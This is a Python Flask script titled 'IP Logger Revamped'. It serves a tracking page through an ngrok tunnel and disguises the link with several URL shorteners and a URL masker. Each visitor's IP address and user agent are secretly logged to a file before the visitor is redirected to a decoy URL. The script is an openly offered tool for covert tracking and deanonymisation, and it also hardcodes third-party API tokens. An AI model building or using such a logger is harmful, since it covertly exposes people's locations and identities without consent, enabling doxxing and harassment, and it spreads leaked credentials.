from flask import Flask, request, redirect, abort

app = Flask(__name__)

@app.route('/')
def index():
    if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
        ip = request.environ['REMOTE_ADDR']
    else:
        ip = request.environ['HTTP_X_FORWARDED_FOR']

    user_agent = request.headers.get('User-Agent')

    now = time.localtime()
    current_date = time.strftime("%d/%m/%Y", now)
    current_time = time.strftime("%H:%M:%S", now)

    with open('ip-logger-revamped.txt', 'a') as f:
        f.write(f'{current_date}, {current_time} - {ip} - {user_agent}\n')

    if not ip in ip_list:
        ip_list.append(ip)
        print(f'{Fore.LIGHTBLACK_EX}{current_time} {Fore.WHITE}- {theme}{ip} {Fore.WHITE}- {Fore.LIGHTWHITE_EX}{user_agent}')
        
    if link_redirect:
        return redirect(link_redirect, code=302)
    else:
        abort(404)


def shorten_url(url):
    links = []

    # https://autocode.com/url/api/temporary/0.3.0/create/
    try:
        res = r.post('https://url.api.stdlib.com/temporary@0.3.0/create/', params={'url': url, 'ttl': 21600}, headers={'Content-Type': 'text/json'})
        if res.status_code == 200:
            data = json.loads(res.text)
            if data['link_url']:
                links.append(data['link_url'])
    except:
        pass

    # https://jinxed.cf/api
    try:
        res = r.post('https://jinxed.cf', data={'url': url}, headers={'Accept': 'application/json'})
        if res.status_code == 200:
            data = json.loads(res.text)
            if data['short_url']:
                links.append(data['short_url'])
    except:
        pass

    # https://github.com/Axorax/urlmskr#urlmskr-api
    try:
        res = r.get(f'https://urlmskr.axorax.repl.co/?r={url}')
        if res.status_code == 200:
            data = json.loads(res.text)
            if data['success'] == True:
                links.append(data['url'])
    except:
        pass

    if len(links) >= 2: return links
    chance = 100 if len(links == 0) else 50

    # https://tinyurl.com/app/dev
    try:
        if randint(1, 100) < chance:
            res = r.post('https://api.tinyurl.com/create?api_token=9FtG3R0bLuCBnlnQPhvDMPqqthcpdDKcySPpsRt81E6WlLfMh97ABVRIEKrI', json={'url': url}, headers={'accept': 'application/json', 'Content-Type': 'application/json'})
            if res.status_code == 200:
                data = json.loads(res.text)
                if data['data']['tiny_url']:
                    links.append(data['data']['tiny_url'])
    except:
        pass

    # https://urlbae.com/developers
    try:
        if randint(1, 100) < chance:
            res = r.post('https://urlbae.com/api/url/add', json={'url': url}, headers={'Content-Type': 'application/json', 'Authorization': 'Bearer 65083f68b90679b77434689e771a57be'})
            if res.status_code == 200:
                data = json.loads(res.text)
                if data['error'] == 0:
                    links.append(data['shorturl'])
    except:
        pass

    return links


if __name__ == '__main__':
    import time
    import json
    import requests as r
    from colorama import Fore
    from pyngrok import ngrok
    from random import randint, choice
    # from os import get_terminal_size
    # offset = ' ' * int(((get_terminal_size()[0] - 59 + 2) / 2)) # 59 = length of logo

    port = f'50{randint(10, 99)}'

    colors = [Fore.LIGHTRED_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTCYAN_EX, Fore.LIGHTYELLOW_EX]
    theme = choice(colors)
    print(Fore.LIGHTBLACK_EX + ' ▪   ▄▄▄·    ▄▄▌         ▄▄ •  ▄▄ • ▄▄▄ .▄▄▄                ')
    print(Fore.LIGHTBLACK_EX + ' ██ ▐█ ▄█    ██•  ▪     ▐█ ▀ ▪▐█ ▀ ▪▀▄.▀·▀▄ █·              ')
    print(Fore.LIGHTBLACK_EX + ' ▐█· ██▀·    ██▪   ▄█▀▄ ▄█ ▀█▄▄█ ▀█▄▐▀▀▪▄▐▀▀▄               ')
    print(Fore.LIGHTBLACK_EX + ' ▐█▌▐█▪·•    ▐█▌▐▌▐█▌.▐▌▐█▄▪▐█▐█▄▪▐█▐█▄▄▌▐█•█▌              ')
    print(Fore.LIGHTBLACK_EX + ' ▀▀▀.▀       .▀▀▀  ▀█▄▀▪·▀▀▀▀ ·▀▀▀▀  ▀▀▀ .▀  ▀              ')
    print(theme + '             ▄▄▄  ▄▄▄ . ▌ ▐· ▄▄▄· • ▌ ▄ ·.  ▄▄▄·▄▄▄ .·▄▄▄▄  ')
    print(theme + '             ▀▄ █·▀▄.▀·▪█·█▌▐█ ▀█ ·██ ▐███▪▐█ ▄█▀▄.▀·██▪ ██ ')
    print(theme + '             ▐▀▀▄ ▐▀▀▪▄▐█▐█•▄█▀▀█ ▐█ ▌▐▌▐█· ██▀·▐▀▀▪▄▐█· ▐█▌')
    print(theme + '             ▐█•█▌▐█▄▄▌ ███ ▐█ ▪▐▌██ ██▌▐█▌▐█▪·•▐█▄▄▌██. ██ ')
    print(theme + '             .▀  ▀ ▀▀▀ . ▀   ▀  ▀ ▀▀  █▪▀▀▀.▀    ▀▀▀ ▀▀▀▀▀• ')
    print(f'              {Fore.LIGHTBLACK_EX}Made with {theme}♥ {Fore.LIGHTBLACK_EX}by {Fore.WHITE}https://github.com/hXR16F\n')
    # print(f'              {Fore.LIGHTBLACK_EX}Old script: {Fore.WHITE}https://github.com/hXR16F/IP-Logger\n')

    link_redirect = input(f'{Fore.LIGHTBLACK_EX}({theme}•{Fore.LIGHTBLACK_EX}) {Fore.WHITE}Redirect URL {Fore.LIGHTBLACK_EX}(leave blank for invalid response){Fore.WHITE}: ')
    if not 'http' in link_redirect:
        link_redirect = f'http://{link_redirect}'

    print(f'{Fore.LIGHTBLACK_EX}({theme}•{Fore.LIGHTBLACK_EX}) {Fore.LIGHTBLACK_EX}Generating links...')
    try:
        http_tunnel = ngrok.connect(port)
        direct = http_tunnel.public_url
    except:
        print(f'\n{Fore.LIGHTRED_EX}ERROR: {Fore.WHITE}ngrok is not installed or properly configured - https://ngrok.com')
        exit()

    links = shorten_url(direct)

    print(f'  {Fore.LIGHTBLACK_EX}({theme}•{Fore.LIGHTBLACK_EX}) {Fore.LIGHTBLACK_EX}Direct logger link: {theme}{direct}')
    if links:
        print(f'  {Fore.LIGHTBLACK_EX}({theme}•{Fore.LIGHTBLACK_EX}) {Fore.LIGHTBLACK_EX}Shortened links:')
        for link in links:
            print(f'    {Fore.LIGHTBLACK_EX}({theme}•{Fore.LIGHTBLACK_EX}) {Fore.LIGHTWHITE_EX}{link}')

    print(f'\n{Fore.LIGHTBLACK_EX}({theme}•{Fore.LIGHTBLACK_EX}) {Fore.WHITE}Listening on {theme}0.0.0.0:{port}')
    print(f'{Fore.LIGHTBLACK_EX}({theme}•{Fore.LIGHTBLACK_EX}) {Fore.WHITE}Waiting for incoming connections...\n')
    ip_list = []
    
    from waitress import serve
    serve(app, host="0.0.0.0", port=port)

    # app.run(host='0.0.0.0', debug=False)
